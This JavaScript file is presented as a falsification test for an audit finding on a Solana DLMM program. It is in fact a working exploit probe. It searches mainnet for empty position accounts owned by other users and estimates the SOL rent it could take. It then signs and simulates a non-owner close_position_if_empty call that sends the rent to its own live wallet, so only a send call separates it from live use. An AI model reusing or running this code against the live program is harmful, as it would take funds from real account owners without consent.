// f1_rent_probe.mjs — falsification test for CODE_AUDIT.md Finding F1:
// can a NON-OWNER close an empty DLMM position via close_position_if_empty
// and route rent to themselves? Simulate only — no send.
//
// PositionV2 layout: disc(8) lb_pair(32) owner(32) liquidity_shares(1120)...
// Empty position => bytes [72,1192) all zero. Server-side memcmp on the first
// 32 bytes of liquidity_shares finds empties without downloading 1.4GB.
import { Connection, Keypair, PublicKey, TransactionMessage, VersionedTransaction } from '@solana/web3.js';
import { Program, AnchorProvider, Wallet } from '@coral-xyz/anchor';
import fs from 'fs';
import path from 'path';

const MON = path.dirname(new URL(import.meta.url).pathname) + '/..';
const IDL = JSON.parse(fs.readFileSync(path.join(MON, 'dlmm_idl.json')));
const PROG = new PublicKey('LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo');
const key = fs.readFileSync(path.join(MON, 'helius_key.txt'), 'utf8').trim();
const conn = new Connection(`https://mainnet.helius-rpc.com/?api-key=${key}`, 'confirmed');
const wraw = JSON.parse(fs.readFileSync(path.join(MON, 'live_wallet.json')));
const wallet = Keypair.fromSecretKey(Uint8Array.from(wraw.keypair_bytes));

const ZERO32 = '11111111111111111111111111111111'; // base58 of 32 zero bytes

// 1) empties: full 8120B + zero liquidity_shares (first 32B checked server-side)
const empties = await conn.getProgramAccounts(PROG, {
  filters: [
    { dataSize: 8120 },
    { memcmp: { offset: 72, bytes: ZERO32 } },
  ],
  dataSlice: { offset: 40, length: 32 },  // owner only
  encoding: 'base64',
});
console.log('empty position accounts chain-wide:', empties.length);
const ours = wallet.publicKey.toBase58();
const foreign = empties.filter(a => {
  const raw = Array.isArray(a.account.data) ? a.account.data[0] : a.account.data;
  const buf = Buffer.isBuffer(raw) ? raw : Buffer.from(raw, 'base64');
  return new PublicKey(buf).toBase58() !== ours;
});
console.log('foreign empties:', foreign.length, ' est rent:', (foreign.length * 0.0419).toFixed(1), 'SOL');
if (!foreign.length) { console.log('no foreign empties — lane dead on population'); process.exit(0); }

// 2) pick one, simulate non-owner close with rent to ourselves
const target = foreign[0].pubkey;
console.log('probe target:', target.toBase58());
const provider = new AnchorProvider(conn, new Wallet(wallet), {});
const program = new Program(IDL, PROG, provider);
const ix = await program.methods.closePositionIfEmpty()
  .accounts({ position: target, sender: wallet.publicKey, rentReceiver: wallet.publicKey })
  .instruction();
const { blockhash } = await conn.getLatestBlockhash();
const msg = new TransactionMessage({ payerKey: wallet.publicKey, recentBlockhash: blockhash, instructions: [ix] }).compileToV0Message();
const vtx = new VersionedTransaction(msg);
vtx.sign([wallet]);
const sim = await conn.simulateTransaction(vtx);
console.log('simulation err:', JSON.stringify(sim.value.err));
console.log('logs tail:', (sim.value.logs || []).slice(-5).join(' | '));
